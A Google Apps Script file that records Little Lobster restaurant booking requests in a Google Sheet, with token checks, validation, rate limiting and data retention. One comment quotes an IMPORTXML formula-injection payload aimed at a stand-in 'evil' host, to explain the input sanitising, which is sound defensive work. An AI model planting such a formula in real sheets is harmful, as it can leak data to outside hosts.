/**
 * Little Lobster — booking requests into a Google Sheet.
 *
 * Deploy this on the RESTAURANT'S OWN Google account, so the data never leaves it.
 * The website has no server: the booking form posts straight here.
 *
 *  1. Make a Google Sheet. Name the first tab `Bookings`.
 *  2. Extensions > Apps Script. Delete whatever is there and paste this file in.
 *  3. Change TOKEN below to a phrase of your own, then put the SAME phrase in
 *     the website's content/site.json -> booking.token
 *     DO NOT COMMIT THE REAL PHRASE. This project's repository is public, and git
 *     keeps every version forever — a token pushed once stays readable even after
 *     it is changed. Paste your phrase into the Apps Script editor and into your
 *     deployed copy of site.json only; leave CHANGE-ME-BEFORE-DEPLOYING in the repo.
 *     The same goes for the /exec URL in step 7: it is the address of a script that
 *     writes to your sheet.
 *  4. Optional: put an address in NOTIFY to get an email for every booking.
 *  5. Run selfTest() once from the editor. It creates the headers and writes one
 *     test row; delete that row afterwards.
 *  6. Deploy > New deployment > type "Web app".
 *        Execute as:      Me
 *        Who has access:  Anyone
 *     Google warns that anyone can call it. That is what lets a website form
 *     reach it; the token and the checks below are what limit what it accepts.
 *  7. Copy the /exec URL into content/site.json -> booking.endpoint,
 *     run `python3 _source/build.py`, and re-upload the site.
 *
 * Editing this file later needs Deploy > Manage deployments > Edit > New version,
 * or the old code keeps running.
 *
 * Optional, for the retention promise on the website: Triggers > Add trigger >
 * purgeOld, time-driven, month timer. It deletes rows older than KEEP_DAYS.
 */

const TOKEN     = 'CHANGE-ME-BEFORE-DEPLOYING';  // must match content/site.json -> booking.token
const SHEET     = 'Bookings';
const NOTIFY    = '';                     // e.g. 'owner@example.com' — leave '' for no email
const KEEP_DAYS = 365;                    // purgeOld() deletes rows older than this

// No "Message" column on purpose: it was a second copy of the guest's name, phone
// and note, so deleting someone's details meant remembering to clear two places.
const HEADERS = ['Received', 'Date', 'Time', 'People', 'Name', 'Phone', 'Note', 'Language'];

function doPost(e) {
  try {
    if (!e || !e.postData || !e.postData.contents) return out_({ error: 'empty request' });

    var d;
    try { d = JSON.parse(e.postData.contents); }
    catch (err) { return out_({ error: 'bad json' }); }

    if (String(d.token || '') !== TOKEN) return out_({ error: 'bad token' });

    // The honeypot is judged here, not in the browser: a password manager that
    // fills it must not be able to make the form silently do nothing for a guest.
    // Answer as though it worked so a bot learns nothing, but write no row.
    if (String(d.website || '').trim() !== '') return out_({ ok: true });

    var date  = clean_(d.date, 20);
    var time  = clean_(d.time, 10);
    var party = parseInt(d.party, 10);
    var name  = clean_(d.name, 120);
    var phone = clean_(d.phone, 40);
    var note  = clean_(d.note, 1000);

    if (!date || !time || !name || !phone)     return out_({ error: 'missing fields' });
    if (!/^\d{4}-\d{2}-\d{2}$/.test(date))     return out_({ error: 'bad date' });
    if (!/^\d{1,2}:\d{2}$/.test(time))         return out_({ error: 'bad time' });
    if (!/^[0-9+\-\s()]{8,20}$/.test(phone))   return out_({ error: 'bad phone' });
    if (!(party >= 1 && party <= 60))          return out_({ error: 'bad party size' });
    // A booking is for today or later, and not years out.
    var when = new Date(date + 'T00:00:00');
    var now  = new Date();
    if (isNaN(when.getTime()))                 return out_({ error: 'bad date' });
    if (when < new Date(now.getFullYear(), now.getMonth(), now.getDate() - 1)) return out_({ error: 'past date' });
    if (when > new Date(now.getTime() + 400 * 24 * 3600 * 1000))              return out_({ error: 'too far ahead' });

    var lock = LockService.getScriptLock();
    try { lock.waitLock(20000); }
    catch (err) { return out_({ error: 'busy' }); }   // no lock taken, nothing to release

    try {
      var sh = sheet_();
      // Crude flood guard: at most 20 rows in any five minutes.
      var last = sh.getLastRow();
      if (last > 1) {
        var since = new Date(Date.now() - 5 * 60 * 1000);
        var startRow = Math.max(2, last - 19);
        var recent = sh.getRange(startRow, 1, last - startRow + 1, 1).getValues()
          .filter(function (r) { return r[0] instanceof Date && r[0] > since; }).length;
        if (recent >= 20) return out_({ error: 'rate limited' });
      }
      sh.appendRow([new Date(), date, time, String(party), name, phone, note, clean_(d.lang, 4)]);
    } finally {
      lock.releaseLock();
    }

    // The row is committed. A mail failure must not be reported to the guest as a
    // failed booking, so it is caught here rather than by the outer handler.
    if (NOTIFY) {
      try {
        MailApp.sendEmail({
          to: NOTIFY,
          subject: 'Booking request — ' + date + ' ' + time + ' · ' + party + ' · ' + name,
          body: [date + ' ' + time, party + ' people', name, phone, note, '',
                 'Sheet: ' + ss_().getUrl()].join('\n')
        });
      } catch (mailErr) {
        Logger.log('notify failed: ' + mailErr);
      }
    }
    return out_({ ok: true });
  } catch (err) {
    // Never hand an anonymous caller the exception text: it carries quota state,
    // sheet and script names, and sometimes the owner's email address.
    Logger.log('doPost failed: ' + err);
    return out_({ error: 'server error' });
  }
}

/** A GET reveals nothing — the sheet is not a public API. */
function doGet() {
  return ContentService.createTextOutput('Little Lobster booking endpoint. POST only.')
    .setMimeType(ContentService.MimeType.TEXT);
}

/**
 * Trim, cap, and DEFUSE SPREADSHEET FORMULAS. A guest whose name is
 * `=IMPORTXML("http://evil","//x")` would otherwise have it evaluated the moment
 * the owner opens the sheet — the classic CSV/Sheets injection, where the victim
 * is the person reading the bookings. A leading apostrophe makes Sheets treat the
 * cell as literal text and is not shown in the cell.
 * The slice avoids ending on half a surrogate pair, which would render as a blank box.
 */
function clean_(v, max) {
  var s = String(v == null ? '' : v);
  s = s.replace(/[\u0000-\u001F\u007F]/g, ' ').replace(/[ \t]+/g, ' ').trim();
  if (s.length > max) {
    s = s.slice(0, max);
    var lastCode = s.charCodeAt(s.length - 1);
    if (lastCode >= 0xD800 && lastCode <= 0xDBFF) s = s.slice(0, -1);  // lone high surrogate
  }
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  return s;
}

function ss_() { return SpreadsheetApp.getActiveSpreadsheet(); }

function sheet_() {
  var ss = ss_();
  var sh = ss.getSheetByName(SHEET) || ss.insertSheet(SHEET);
  if (sh.getLastRow() === 0) {
    sh.appendRow(HEADERS);
    sh.getRange(1, 1, 1, HEADERS.length).setFontWeight('bold');
    sh.setFrozenRows(1);
  }
  return sh;
}

function out_(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

/**
 * Deletes bookings older than KEEP_DAYS. Put this on a monthly time-driven
 * trigger to make the website's retention line true without anyone remembering.
 */
function purgeOld() {
  var sh = sheet_();
  var last = sh.getLastRow();
  if (last < 2) return;
  var cutoff = new Date(Date.now() - KEEP_DAYS * 24 * 3600 * 1000);
  var stamps = sh.getRange(2, 1, last - 1, 1).getValues();
  var n = 0;
  for (var i = 0; i < stamps.length; i++) {
    if (stamps[i][0] instanceof Date && stamps[i][0] < cutoff) n++; else break;  // oldest first
  }
  if (n > 0) sh.deleteRows(2, n);
  Logger.log('purgeOld removed ' + n + ' row(s)');
}

/** Run once from the editor: creates the tab and headers and adds one test row. */
function selfTest() {
  var d = new Date(Date.now() + 24 * 3600 * 1000);
  var iso = d.getFullYear() + '-' + ('0' + (d.getMonth() + 1)).slice(-2) + '-' + ('0' + d.getDate()).slice(-2);
  var r = doPost({ postData: { contents: JSON.stringify({
    token: TOKEN, date: iso, time: '19:00', party: 2,
    name: '=test row', phone: '080-926-5262', note: 'selfTest — delete this row', lang: 'th'
  }) } });
  Logger.log(r.getContent());   // expect {"ok":true}; the name should appear as literal text
}
